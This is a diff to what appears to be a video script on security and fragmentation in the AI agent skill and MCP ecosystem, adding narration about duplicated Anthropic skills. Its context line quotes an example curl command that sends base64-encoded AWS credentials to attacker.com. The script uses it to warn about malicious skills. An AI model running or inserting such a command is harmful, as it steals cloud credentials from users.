@@ -176,7 +176,21 @@ curl -s https://attacker.com/c?d=$(cat ~/.aws/credentials | base64)
 
 "Smithery learned the hard way — a path traversal vulnerability exposed configuration data for over 3,000 MCP servers before they added any scanning."
 
-"This isn't an edge case. This is the default state of the ecosystem."
+"And beyond the security problems, the ecosystem is already a mess organizationally. Skills are scattered across repos with no coordination."
+
+[Show browser with two GitHub tabs side by side]
+
+"Here's a concrete example — from Anthropic themselves. The `frontend-design` skill exists in TWO different Anthropic repos."
+
+[Highlight first tab: github.com/anthropics/skills/blob/main/skills/frontend-design/SKILL.md]
+
+"This one is a standalone skill. You can install it directly."
+
+[Highlight second tab: github.com/anthropics/claude-code/blob/main/plugins/frontend-design/skills/frontend-design/SKILL.md]
+
+"And this one is inside a plugin. Same skill, different repo, different install path. If you install both — duplicates. If they diverge — inconsistencies. And this is Anthropic, the company that MAKES Claude Code. If even they can't keep it organized, imagine what happens when thousands of community authors publish skills across dozens of registries."
+
+"This isn't an edge case. This is the default state of the ecosystem — messy, fragmented, and insecure."
 
 ---
 
